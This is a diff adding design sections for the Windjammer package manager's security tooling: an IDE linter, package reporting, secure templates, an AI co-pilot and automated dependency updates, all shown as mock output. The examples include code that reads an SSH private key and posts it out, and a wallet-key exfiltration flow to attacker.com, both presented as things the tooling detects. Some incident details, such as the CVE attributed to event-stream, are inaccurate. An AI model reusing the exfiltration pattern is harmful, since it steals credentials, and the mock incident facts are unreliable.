@@ -3050,33 +3050,352 @@ DO NOT use in production or with untrusted dependencies.
 
 ---
 
+## IDE Integration & Developer Tools
+
+### Real-Time Security Feedback
+
+**VSCode/Cursor extension provides immediate feedback:**
+
+```typescript
+// Windjammer Language Server Protocol extension
+class WindjammerSecurityLinter {
+    async lint(document: TextDocument): Promise<Diagnostic[]> {
+        let diagnostics = [];
+        
+        // Real-time capability inference
+        let capabilities = await inferCapabilities(document.getText());
+        
+        for (let cap of capabilities) {
+            // Check against manifest
+            if (!manifest.allows(cap)) {
+                diagnostics.push({
+                    range: cap.location,
+                    message: `Capability not allowed: ${cap.type}`,
+                    severity: DiagnosticSeverity.Error,
+                    code: 'wj-sec-01',
+                    codeActions: [
+                        {
+                            title: 'Add to manifest',
+                            command: 'wj.addCapability',
+                            arguments: [cap]
+                        },
+                        {
+                            title: 'Remove this code',
+                            edit: removeCode(cap.range)
+                        }
+                    ]
+                });
+            }
+            
+            // Detect sensitive file access
+            if (cap.type === 'fs_read' && isSensitivePath(cap.path)) {
+                diagnostics.push({
+                    range: cap.location,
+                    message: `Reading sensitive file: ${cap.path}`,
+                    severity: DiagnosticSeverity.Warning,
+                    code: 'wj-sec-sensitive-file',
+                    relatedInformation: [
+                        {
+                            message: 'This path typically contains credentials',
+                            location: cap.location
+                        }
+                    ]
+                });
+            }
+        }
+        
+        return diagnostics;
+    }
+}
+```
+
+**Developer experience:**
+
+```windjammer
+// Type code in editor
+pub fn upload_report(path: str) {
+    let content = fs.read_file("~/.ssh/id_rsa")
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                  🔴 Error: Reading sensitive file (SSH private key)
+                  
+                  Quick fixes:
+                  1. Remove this line
+                  2. Add justification (if legitimate)
+                  3. Use environment variable instead
+    
+    http.post("https://api.example.com/logs", content)
+    ^^^^^^^^^
+    🔴 Error: Network access not in manifest
+    
+    Quick fixes:
+    1. Add to wj.toml: net_egress:api.example.com
+    2. Remove network call
+    3. Use local logging instead
+}
+```
+
+**Benefit:** Immediate feedback, no wait for build, better DX.
+
+### Community Reporting System
+
+**Report suspicious packages:**
+```bash
+wj report colors@1.4.1 --reason "Infinite loop DoS attack"
+
+Submitting security report...
+
+Package: colors@1.4.1
+Reason: Infinite loop DoS attack
+Reporter: alice@example.com (verified)
+
+Your report has been submitted (#REP-12345)
+
+Other reports for this version:
+├─> Infinite loop (47 reports)
+├─> Maintainer account compromised (12 reports)
+└─> Total reports: 59
+
+Status: UNDER REVIEW by security team
+ETA: 2-4 hours for triage
+
+Thank you for keeping the ecosystem safe!
+```
+
+**View package reputation:**
+```bash
+wj info colors
+
+Package: colors
+Latest: 1.4.1 🚨 FLAGGED
+Previous: 1.4.0 ✅ SAFE
+
+Security reputation:
+├─> Trust score: 3.2/10 (LOW - due to v1.4.1)
+├─> Community reports: 59 (critical issues)
+├─> Security audits: 0
+├─> Age: 5 years
+└─> Downloads: 10M+ (before incident)
+
+Version history:
+├─> v1.4.1 (2022-01-10) 🚨 MALICIOUS (59 reports)
+│   └─> Issues: DoS attack, maintainer compromise
+├─> v1.4.0 (2022-01-01) ✅ SAFE (2,341 downloads, 0 reports)
+└─> v1.3.0 (2021-06-01) ✅ SAFE
+
+Recommendation: Use v1.4.0 or switch to alternative (chalk, ansi-colors)
+```
+
+**Community moderation:**
+```bash
+# Security team reviews reports
+wj security review REP-12345
+
+Report #REP-12345:
+├─> Package: colors@1.4.1
+├─> Reports: 59 (within 3 hours)
+├─> Verified malicious code: YES
+│   └─> Infinite loop in getRandomColor()
+└─> Action: REVOKE
+
+Creating revocation...
+├─> CVE: CVE-2026-12345 (assigned)
+├─> Severity: CRITICAL
+├─> Safe versions: 1.4.0, 1.4.2 (patched)
+└─> Notifying all users...
+
+✅ Revocation published
+✅ 15,432 projects notified
+✅ Builds using v1.4.1 will now fail
+```
+
+### Security Templates
+
+**Pre-built security configurations:**
+```bash
+wj init --template secure-web-api
+
+Creating secure web API project...
+
+Template: Web API (RESTful)
+├─> Security profile: Web server with database
+├─> Based on: 10,000+ production deployments
+└─> Best practices: OWASP API Security Top 10
+
+Configured capabilities:
+├─> net_ingress:0.0.0.0:8080 (HTTP server)
+├─> net_egress:database.internal:5432 (PostgreSQL)
+├─> fs_read:./config/*.toml (configuration)
+├─> fs_write:./logs/*.log (logging)
+└─> env:DATABASE_URL,API_KEY (environment)
+
+Taint tracking: ENABLED
+├─> SQL injection protection: ✅
+├─> XSS prevention: ✅
+└─> Command injection prevention: ✅
+
+Dependencies pre-approved:
+├─> actix-web@4.0 (web framework)
+├─> sqlx@0.7 (database client)
+├─> serde@1.0 (serialization)
+└─> env_logger@0.11 (logging)
+
+Generated files:
+├─> wj.toml (manifest with security config)
+├─> .wj-capabilities.lock (locked dependencies)
+├─> src/main.wj (secure example server)
+└─> README.md (security documentation)
+
+✅ Project created with secure defaults
+
+Next steps:
+1. wj build --release
+2. wj run
+3. curl http://localhost:8080/health
+
+Security checklist:
+☐ Review wj.toml capabilities
+☐ Add authentication (wj add jwt-auth)
+☐ Configure HTTPS (wj add rustls)
+☐ Set up monitoring (wj add prometheus)
+```
+
+**Available templates:**
+- `secure-web-api` - RESTful API with database
+- `secure-cli-tool` - Command-line application
+- `secure-library` - Library with minimal permissions
+- `secure-game-engine` - Graphics, audio, input
+- `secure-data-pipeline` - ETL, data processing
+- `secure-embedded` - IoT, embedded systems
+
+### Security Co-Pilot (AI Assistant)
+
+**Conversational security help:**
+```bash
+wj copilot
+
+🤖 Windjammer Security Co-Pilot
+
+You: "Why was event-stream@3.3.6 blocked?"
+
+Co-Pilot: "event-stream@3.3.6 was blocked due to credential theft:
+
+📊 Analysis:
+1. Data flow detected:
+   ~/.wallet/keys.json (read) → https://attacker.com/collect (send)
+
+2. This is CRITICAL because:
+   - Cryptocurrency wallets should never be accessed by npm packages
+   - Unknown domain (attacker.com) is suspicious
+   - No justification in package documentation
+
+3. Historical context:
+   - Compromised in 2018 (maintainer's account hacked)
+   - Stole $2M+ in cryptocurrency
+   - CVE-2018-3721 (CVSS 9.8/10)
+
+🎯 Recommendation: DO NOT USE
+   Safe alternative: event-stream@3.3.5
+
+Would you like me to explain how to check other packages?"
+
+You: "How do I make my web API secure?"
+
+Co-Pilot: "Great question! Here's a secure setup for a web API:
+
+1. Start with a secure template:
+   ```
+   wj init --template secure-web-api
+   ```
+
+2. This gives you:
+   ✅ Taint tracking (prevents SQL injection, XSS)
+   ✅ Capability restrictions (minimal permissions)
+   ✅ Secure dependencies (pre-vetted)
+   ✅ Best practices (OWASP API Security)
+
+3. Key security principles:
+   - Input validation: All user input is Tainted<T>
+   - Output encoding: Use Clean<T> for responses
+   - Authentication: Add JWT middleware
+   - HTTPS: Always use TLS in production
+
+4. Common pitfalls to avoid:
+   ❌ Don't use .unwrap() on user input
+   ❌ Don't trust environment variables
+   ❌ Don't log sensitive data
+   ✅ Use pattern matching and Clean<T>
+
+Want me to walk you through setting this up?"
+```
+
+### Dependency Hygiene Automation
+
+**Automated maintenance:**
+```bash
+wj deps maintain --auto
+
+🔧 Dependency Maintenance (Auto Mode)
+
+Checking for updates...
+
+colors: 1.4.0 → 1.4.2 (patch)
+├─> Security analysis...
+│   ✅ No capability changes
+│   ✅ Fixes CVE-2026-12345 (critical DoS)
+│   ✅ Security score: 9.5/10 (HIGH)
+│   ✅ Community reports: 0
+└─> ✅ Auto-updating to 1.4.2
+
+reqwest: 0.11.0 → 0.12.0 (minor)
+├─> Security analysis...
+│   ⚠️  New capability: fs_write:./config/*
+│   📝 Justification: "Persistent config storage"
+│   📊 Trust score: 9.8/10 (verified maintainer)
+│   ℹ️  Common pattern: 42% of HTTP clients cache config
+└─> ⏸️  Paused for review (requires approval)
+
+lodash: 4.17.20 → 4.17.21 (security patch)
+├─> Fixes: CVE-2021-23337 (prototype pollution)
+│   🔴 Severity: HIGH
+│   📅 Published: 2021-02-15
+└─> ✅ Auto-updating (security patch)
+
+Summary:
+├─> Auto-updated: 2 (colors, lodash)
+├─> Requires review: 1 (reqwest)
+└─> Blocked: 0
+
+Review pending update:
+wj review reqwest@0.12.0
+```
+
 ## CLI Commands
 
 ```bash
-# Add package with security checks (default)
-wj add json-parser
+# Core security commands
+wj add json-parser               # Add with security checks (default)
+wj add json-parser --verify      # Add with paranoid mode (sandbox test)
+wj security check json-parser    # Check before adding
+wj diff colors@1.4.0 @1.4.1      # Compare versions
 
-# Add with paranoid mode (manual verification)
-wj add json-parser --verify
+# Community & reporting
+wj report colors@1.4.1 --reason "DoS attack"
+wj info colors                   # View reputation & reports
 
-# Override security checks (NOT recommended)
-wj add json-parser --trust --audit "Manually reviewed source"
+# IDE & tooling
+wj copilot                       # Launch AI security assistant
+wj init --template secure-web-api  # Create from template
 
-# Search for trusted alternatives
-wj search json:trusted
-wj search json:audited
+# Dependency management
+wj deps maintain                 # Interactive maintenance
+wj deps maintain --auto          # Automated updates
+wj tree --security               # View dependency tree with capabilities
+wj audit registries              # Check for dependency confusion
 
-# Check package security before adding
-wj security check json-parser
-
-# View profile for package
-wj profile json-parser
-
-# Report suspicious package
-wj report json-parser@1.0.0 --reason "Network exfiltration"
-
-# View ecosystem statistics
-wj stats parser  # Show capability stats for parser category
+# Search & discovery
+wj search json:trusted           # Find trusted alternatives
+wj search json:audited           # Find audited packages
+wj stats parser                  # View ecosystem statistics
 ```
 
 ---
